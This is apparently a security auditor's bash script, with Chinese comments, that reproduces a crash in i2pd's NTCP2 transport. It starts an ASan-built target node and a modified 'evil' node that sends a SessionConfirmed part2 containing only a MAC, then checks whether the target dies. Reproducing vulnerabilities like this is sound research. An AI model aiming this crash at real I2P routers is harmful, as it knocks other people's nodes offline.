#!/bin/bash
# NTCP2 m3p2Len=16 空 vector 解引用 —— 一体化复现
# 用法: bash run_ntcp2_lab.sh [flavor]
source /home/z/my-project/audit/env.sh
FLAVOR=${1:-asan}
TARGET_BIN=$BUILDS/$FLAVOR/i2pd
EVIL_BIN=$BUILDS/evil/i2pd
LAB=$BUILDS/lab-ntcp2-$FLAVOR

rm -rf $LAB; mkdir -p $LAB/target $LAB/evil
pkill -f "audit/builds/.*i2pd" 2>/dev/null; sleep 2; pkill -9 -f "audit/builds/.*i2pd" 2>/dev/null; sleep 1

cat > $LAB/target.conf << 'EOF'
loglevel = info
host = 21.0.19.150
[reseed]
urls =
[ssu2]
port = 17777
[ntcp2]
port = 17778
[http]
address = 127.0.0.1
port = 7070
EOF

cat > $LAB/evil.conf << 'EOF'
loglevel = info
host = 21.0.19.150
[reseed]
urls =
[ntcp2]
port = 27778
[ssu2]
enabled = false
[http]
address = 127.0.0.1
port = 17071
EOF

echo "[*] 启动目标 ($FLAVOR)"
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:handle_segv=1 \
  $TARGET_BIN --datadir=$LAB/target --conf=$LAB/target.conf > $LAB/target.log 2>&1 &
TPID=$!

for i in $(seq 1 40); do
  rg -q "Start listening" $LAB/target.log 2>/dev/null && break
  kill -0 $TPID 2>/dev/null || { echo "[!] 目标启动崩溃"; break; }
  sleep 1
done
echo "[*] 目标就绪 (${i}s)"

echo "[*] 启动攻击方 (EVIL_NTCP2_M3P2=1 → SessionConfirmed part2 仅 MAC)"
EVIL_NTCP2_M3P2=1 EVIL_TARGET_RI=$LAB/target/router.info \
  $EVIL_BIN --datadir=$LAB/evil --conf=$LAB/evil.conf > $LAB/evil.log 2>&1 &
EPID=$!

crash=0
for i in $(seq 1 90); do
  if ! kill -0 $TPID 2>/dev/null; then crash=1; echo "[!!] 目标死亡 t=${i}s"; break; fi
  sleep 1
done
[ $crash -eq 0 ] && echo "[-] 90s 未崩溃"
kill $EPID 2>/dev/null; sleep 1; kill -9 $EPID 2>/dev/null

echo "===== 攻击方 ====="
rg "EVIL|NTCP2|Session|connect" $LAB/evil.log | head -12
echo "===== 目标 ====="
rg -i "ntcp2|session|segv|sanitizer" $LAB/target.log | head -12
tail -8 $LAB/target.log
echo "NTCP2-LAB-DONE flavor=$FLAVOR crash=$crash"
